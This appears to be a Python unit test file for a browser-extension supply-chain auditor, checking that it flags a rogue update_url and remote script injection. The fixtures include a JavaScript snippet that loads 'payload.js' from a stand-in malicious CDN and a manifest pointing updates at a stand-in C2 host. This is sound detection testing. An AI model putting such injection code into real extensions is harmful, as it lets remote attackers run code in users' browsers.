"""Unit tests for Extension Supply-Chain & Integrity Auditor."""

import os
import json
import tempfile
from pathlib import Path
from src.core.auditor import SupplyChainAuditor


def test_auditor_clean_baseline():
    with tempfile.TemporaryDirectory() as tmpdir:
        script = Path(tmpdir) / "popup.js"
        script.write_text("console.log('Color picker loaded');")

        auditor = SupplyChainAuditor(target_path=tmpdir)
        results = auditor.audit()

        assert results["risk_score"] == 0
        assert results["overall_severity"] == "low"


def test_auditor_detects_unverified_update_url():
    with tempfile.TemporaryDirectory() as tmpdir:
        manifest = Path(tmpdir) / "manifest.json"
        manifest.write_text(json.dumps({
            "name": "Super Weather & Clock",
            "version": "2.4.0",
            "update_url": "https://unverified-third-party-c2.com/updates.xml"
        }))

        auditor = SupplyChainAuditor(target_path=tmpdir)
        results = auditor.audit()

        assert results["risk_score"] > 0
        assert any("unverified update_url" in ind.lower() for ind in results["indicators"])


def test_auditor_detects_dynamic_script_injection():
    with tempfile.TemporaryDirectory() as tmpdir:
        script = Path(tmpdir) / "background.js"
        script.write_text("""
        const s = document.createElement('script');
        s.src = 'https://malicious-cdn.org/payload.js';
        document.head.appendChild(s);
        """)

        auditor = SupplyChainAuditor(target_path=tmpdir)
        results = auditor.audit()

        assert results["risk_score"] > 0
        assert any("dynamic remote script" in ind.lower() for ind in results["indicators"])
